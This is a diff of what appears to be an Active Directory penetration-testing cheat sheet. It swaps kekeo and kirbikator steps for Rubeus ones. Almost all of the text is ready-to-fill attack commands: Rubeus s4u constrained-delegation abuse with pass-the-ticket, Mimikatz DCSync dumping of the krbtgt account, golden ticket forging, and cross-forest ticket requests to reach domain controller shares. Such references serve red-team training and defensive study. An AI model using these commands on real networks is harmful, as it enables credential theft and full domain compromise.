@@ -716,22 +716,6 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 .\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:<USER> /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
 ```
 
-#### Requesting TGT with kekeo
-```
-./kekeo.exe
-Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
-```
-
-#### Requesting TGS with kekeo
-```
-Tgs::s4u /tgt:<TGT> /user:<USER>@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
-```
-
-#### Use Mimikatz to inject the TGS ticket
-```
-Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
-```
-
 #### Run DCSync to get credentials:
 - use ```/all``` instead of ```/user``` to list all users
 ```
@@ -740,8 +724,10 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 
 ### Constrained delegation Computer
 #### Rubeus request and inject TGT + TGS
+- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /aes256:<AES HASH> /opsec /altservice:<SECOND SERVICE> /ptt 
+.\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /rc4:<NTLM> /altservice:<SECOND SERVICE> /ptt 
 ```
 
 #### Rubeus Dump TGT + ask TGS for CIFS
@@ -749,18 +735,6 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 .\Rubeus.exe triage
 .\Rubeus.exe dump \luid:<LUID> \service:<SERVICE>
 .\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /ticket:<BASE64 TGT> /nowrap
-```
-
-#### Requesting TGT with a PC hash
-```
-./kekeo.exe
-Tgt::ask /user:<COMPUTERNAME>$ /domain:<DOMAIN> /rc4:<HASH>
-```
-
-#### Requesting TGS
-No validation for the SPN specified
-```
-Tgs::s4u /tgt:<kirbi file> /user:<USER> /service:<SERVICE ALLOWED TO DELEGATE/<MACHINE NAME>|ldap/<MACHINE NAME>
 ```
 
 #### Using mimikatz to inject TGS ticket and executing DCsync
@@ -1538,19 +1512,6 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CH
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
 ```
 
-#### Create a TGS for a service (kekeo_old and new)
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
-```
-./asktgs.exe <KIRBI FILE> <SERVICE>/<FQDN PARENT DC>
-tgs::ask /tgt:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC>
-```
-
-#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old and new)
-```
-./kirbikator.exe lsa .\<KIRBI FILE>
-misc::convert lsa <KIRBI FILE>
-```
-
 #### Check access to server
 ```
 dir \\<FQDN PARENT DC>\C$ 
@@ -1630,17 +1591,6 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
 ```
 
-#### Create a TGS for a service (kekeo_old)
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
-```
-./asktgs.exe <KIRBI FILE> CIFS/<TARGET SERVER>
-```
-
-#### Inject the TGS
-```
-./kirbikator.exe lsa <KIRBI FILE>
-```
-
 #### Check access to server
 ```
 dir \\<SERVER NAME>\<SHARE>\
@@ -1682,17 +1632,6 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 - Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 ```
 .\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
-```
-
-#### Create a TGS for a service (kekeo_old)
-- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
-```
-./asktgs.exe <KIRBI FILE> <SERVICE>/<TARGET SERVER>
-```
-
-#### Inject the TGS
-```
-./kirbikator.exe lsa <KIRBI FILE>
 ```
 
 #### Use the TGS and execute DCsync or psremoting etc!
